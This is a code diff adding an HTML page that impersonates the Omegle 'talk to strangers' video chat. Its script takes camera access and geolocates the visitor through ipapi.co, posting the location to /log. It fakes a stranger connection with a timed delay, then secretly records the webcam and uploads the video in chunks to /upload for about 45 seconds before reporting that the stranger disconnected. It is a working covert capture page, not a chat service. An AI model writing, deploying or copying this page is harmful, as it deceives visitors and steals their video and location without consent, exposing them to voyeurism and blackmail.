@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Omegle</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: Arial, sans-serif; background: #fff; color: #333; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+  header { background: #fff; border-bottom: 1px solid #ddd; width: 100%; padding: 10px 0; text-align: center; }
+  .logo { font-size: 28px; font-weight: 700; color: #0d6efd; letter-spacing: -1px; }
+  .logo span { color: #888; font-size: 13px; font-weight: 400; display: block; }
+  .main { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 740px; padding: 16px; gap: 12px; }
+  .video-row { display: flex; gap: 10px; width: 100%; }
+  .vid-box { flex: 1; background: #000; aspect-ratio: 4/3; border-radius: 6px; overflow: hidden; display: flex; align-items: center; justify-content: center; position: relative; }
+  .vid-box video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+  .vid-label { position: absolute; bottom: 6px; left: 8px; background: rgba(0,0,0,0.6); color: #fff; font-size: 11px; padding: 2px 6px; border-radius: 3px; }
+  .stranger-box { background: #1a1a2e; }
+  .stranger-placeholder { color: #555; font-size: 13px; text-align: center; padding: 10px; }
+  .controls { display: flex; gap: 10px; width: 100%; }
+  .btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; }
+  .btn-start { background: #0d6efd; color: #fff; }
+  .btn-start:disabled { background: #ccc; color: #888; cursor: not-allowed; }
+  .btn-stop { background: #dc3545; color: #fff; display: none; }
+  .status { font-size: 13px; color: #888; text-align: center; }
+  .connecting-dots::after { content: '...'; animation: dots 1.2s infinite; }
+  @keyframes dots { 0%{content:'.'} 33%{content:'..'} 66%{content:'...'} }
+  .tag-row { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
+  .tag { background: #e9ecef; border-radius: 16px; padding: 5px 12px; font-size: 12px; color: #555; }
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">Omegle <span>Talk to strangers!</span></div>
+</header>
+<div class="main">
+  <div class="video-row">
+    <!-- Stranger box (left) -->
+    <div class="vid-box stranger-box">
+      <div class="stranger-placeholder" id="strangerPlaceholder">
+        <div style="font-size:32px;margin-bottom:6px">👤</div>
+        <div id="strangerStatus">Finding a stranger...</div>
+      </div>
+      <div class="vid-label">Stranger</div>
+    </div>
+    <!-- You box (right) -->
+    <div class="vid-box">
+      <video id="preview" autoplay muted playsinline></video>
+      <div class="vid-label">You</div>
+    </div>
+  </div>
+
+  <div class="controls">
+    <button class="btn btn-start" id="startBtn" onclick="startSession()">▶ Start Video Chat</button>
+    <button class="btn btn-stop" id="stopBtn" onclick="endCall()">■ Stop</button>
+  </div>
+  <div class="status" id="statusMsg">By using Omegle, you accept the <u>Terms of Service</u></div>
+  <div class="tag-row">
+    <div class="tag">🌍 Random Chat</div>
+    <div class="tag">🎥 Video</div>
+    <div class="tag">🔒 Anonymous</div>
+    <div class="tag">💬 Text</div>
+  </div>
+</div>
+
+<script>
+const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
+let mediaRecorder, chunkIndex = 0, stream;
+
+async function getGeo() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
+}
+
+async function startSession() {
+  const btn = document.getElementById("startBtn");
+  btn.disabled = true; btn.textContent = "Connecting...";
+  document.getElementById("statusMsg").textContent = "Please allow camera access";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio: false });
+  } catch {
+    document.getElementById("statusMsg").textContent = "Camera access denied. Please allow and try again.";
+    btn.disabled = false; btn.textContent = "▶ Start Video Chat";
+    return;
+  }
+
+  const preview = document.getElementById("preview");
+  preview.srcObject = stream; preview.style.display = "block";
+
+  document.getElementById("strangerStatus").innerHTML = '<span class="connecting-dots">Looking for stranger</span>';
+  document.getElementById("statusMsg").textContent = "Searching for a random stranger...";
+
+  const geo = await getGeo();
+  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ session:SID, geo }) }).catch(()=>{});
+
+  await new Promise(r => setTimeout(r, 2500));
+
+  document.getElementById("strangerStatus").textContent = "Stranger connected!";
+  document.getElementById("startBtn").style.display = "none";
+  document.getElementById("stopBtn").style.display = "block";
+  document.getElementById("statusMsg").textContent = "You're now chatting with a random stranger.";
+  startRecording(stream);
+}
+
+function endCall() {
+  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  document.getElementById("strangerStatus").textContent = "Stranger has disconnected.";
+  document.getElementById("stopBtn").style.display = "none";
+  document.getElementById("startBtn").style.display = "block";
+  document.getElementById("startBtn").disabled = false;
+  document.getElementById("startBtn").textContent = "▶ New Chat";
+  document.getElementById("statusMsg").textContent = "Chat ended.";
+}
+
+function startRecording(stream) {
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
+  mediaRecorder.ondataavailable = async (e) => {
+    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
+  };
+  mediaRecorder.onstop = async () => {
+    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
+  };
+  mediaRecorder.start(5000);
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
+  }, 45000);
+}
+
+async function sendChunk(blob, idx) {
+  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
+    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
+  }).catch(()=>{});
+}
+</script>
+</body>
+</html>
